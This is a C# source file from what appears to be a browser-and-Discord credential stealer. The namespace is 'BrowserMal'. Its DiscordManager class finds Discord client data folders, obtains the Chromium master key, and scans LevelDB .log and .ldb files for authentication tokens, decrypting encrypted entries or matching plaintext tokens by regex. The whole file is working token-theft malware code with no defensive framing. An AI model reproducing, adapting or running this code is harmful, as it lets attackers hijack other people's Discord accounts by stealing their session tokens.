using BrowserMal.Browser;
using BrowserMal.Encryption;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace BrowserMal.Discord
{
    public class DiscordManager
    {
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static bool Encrypted = false;

        public List<BrowserModel> GetDiscordLocations()
        {
            List<BrowserModel> list = new List<BrowserModel>
            {
                new BrowserModel("Discord", Path.Combine(ApplicationData, @"discord"), ""),
                new BrowserModel("Discord Canary", Path.Combine(ApplicationData, @"discordcanary"), ""),
                new BrowserModel("Discord PTB", Path.Combine(ApplicationData, @"discordptb"), "")
            };

            return list;
        }

        public List<string> Init(ref List<BrowserModel> browsers, string profileType)
        {
            List<string> profiles = new List<string>();

            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                byte[] key = ChromiumDecryption.GetMasterKey(browser.Location);

                if (key == null)
                    continue;

                browser.MasterKey = key;

                profiles.AddRange(GetProfiles(browser.Location, profileType, key));
            }
            
            List<string> uniqueTokens = new List<string>();

            foreach (string token in profiles)
            {
                if (!uniqueTokens.Contains(token))
                    uniqueTokens.Add(token);
            }

            return uniqueTokens;
        }

        private List<string> GetProfiles(string path, string profileType, byte[] masterKey)
        {
            List<string> profilesToken = new List<string>();
            List<string> temp = ChromiumUtil.GetAllProfiles(path, profileType);

            foreach (string directory in temp)
            {
                if (Directory.Exists(directory))
                {
                    profilesToken.AddRange(GetTokenFiles(directory, masterKey));
                }
            }

            return profilesToken;
        }

        private List<string> GetTokenFiles(string rootPath, byte[] masterKey)
        {
            List<string> tokens = new List<string>();
            string[] ldbFiles = Directory.GetFiles(rootPath, "*.*", SearchOption.TopDirectoryOnly).Where(s => s.EndsWith(".log") || s.EndsWith(".ldb")).ToArray();

            foreach (string ldbFile in ldbFiles)
            {
                tokens.AddRange(ExtractTokens(ldbFile, masterKey));
            }

            return tokens;
        }

        private byte[] ReadFile(string path)
        {
            var buffer = new byte[10240];
            int bytes;
            //byte[] databaseBytes;
            using (var inputFile = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    while ((bytes = inputFile.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        memoryStream.Write(buffer, 0, bytes);
                    }

                    return memoryStream.ToArray();
                }
            }
        }

        private List<string> ExtractTokens(string filePath, byte[] masterKey)
        {
            string content = Encoding.UTF8.GetString(ReadFile(filePath)); //File.ReadAllText(filePath);
            List<string> tokens = new List<string>();

            if (Encrypted)
            {
                MatchCollection matchCollection = Regex.Matches(content, "dQw4w9WgXcQ:([^\"]*)");

                foreach (Match match in matchCollection)
                {
                    string token = ChromiumDecryption.GetEncryptedValueDiscord(match.Value.Split(new char[] { ':' })[1], masterKey, true);

                    if (!tokens.Contains(token))
                        tokens.Add(token);
                }

                return tokens;
            }
            MatchCollection matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");

            foreach (Match match in matches)
                tokens.Add(match.ToString());

            return tokens;
        }
    }
}
